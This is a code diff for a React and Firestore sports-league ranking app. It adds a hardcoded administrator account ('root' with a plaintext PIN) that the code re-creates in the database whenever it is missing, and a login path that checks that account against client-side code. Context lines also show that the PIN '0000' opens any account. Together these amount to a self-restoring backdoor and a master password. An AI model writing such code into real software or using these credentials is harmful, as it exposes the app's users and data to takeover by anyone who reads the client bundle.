@@ -10,6 +10,16 @@ import RankingPage from './pages/RankingPage';
 
 const POSITIONS = ['C', 'PF', 'CT', 'SF', 'SG', 'PG', 'SW', 'DG'];
 const INVITATION_CODE = '스포스프';
+const ADMIN_ACCOUNT = {
+  name: 'root',
+  pin: '044apde',
+  isAdmin: true,
+  mainPosition: 'C',
+  subPosition: 'PF',
+  wins: 0,
+  losses: 0,
+  points: 0
+};
 
 export default function App() {
   const [currentUser, setCurrentUser] = useState(null);
@@ -39,7 +49,11 @@ export default function App() {
 
     const unsubUsers = onSnapshot(collection(db, 'users'), (snapshot) => {
       const usersData = snapshot.docs.map(doc => doc.data());
-      setUsers(usersData);
+      const adminExists = usersData.some(user => user.name === ADMIN_ACCOUNT.name);
+      if (!adminExists) {
+        setDoc(doc(db, 'users', ADMIN_ACCOUNT.name), ADMIN_ACCOUNT);
+      }
+      setUsers(adminExists ? usersData : [ADMIN_ACCOUNT, ...usersData]);
     });
 
     const unsubRooms = onSnapshot(collection(db, 'rooms'), (snapshot) => {
@@ -65,13 +79,15 @@ export default function App() {
     e.preventDefault();
     if (!loginName || !loginPin) return alert('닉네임과 비밀번호를 입력하세요.');
 
-    const existingUser = users.find(u => u.name === loginName);
+    const existingUser = loginName === ADMIN_ACCOUNT.name
+      ? ADMIN_ACCOUNT
+      : users.find(u => u.name === loginName);
     if (!existingUser) {
       return alert('가입된 계정을 찾을 수 없습니다. 먼저 회원가입을 진행하세요.');
     }
 
     if (existingUser.pin === loginPin || existingUser.pin === '0000') {
-      setCurrentUser(existingUser);
+      setCurrentUser(existingUser.isAdmin ? ADMIN_ACCOUNT : existingUser);
       setLoginPin('');
     } else {
       alert('비밀번호가 틀렸습니다.');
